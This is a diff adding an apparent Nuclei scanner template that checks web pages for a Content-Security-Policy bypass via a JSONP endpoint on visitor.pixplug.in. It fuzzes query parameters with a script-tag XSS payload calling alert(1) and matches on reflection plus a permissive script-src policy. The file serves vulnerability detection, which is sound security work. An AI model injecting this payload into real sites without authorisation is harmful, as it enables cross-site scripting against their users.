@@ -1,0 +1,46 @@
+id: pixplug-csp-xss
+
+info:
+  name: Content-Security-Policy Bypass via PixPlug
+  author: DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/honoki/CSPBypass/blob/c7e4344226a58d96ad16a99d4446f81cd663264e/data.tsv#L174C20-L174C106
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,pixplug
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>'
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{injection}}"
+
+      - type: word
+        part: content_type
+        words:
+          - "text/html"
+
+      - type: word
+        part: content_security_policy
+        words:
+          - "pixplug.in"
+          - "script-src"
+        condition: and
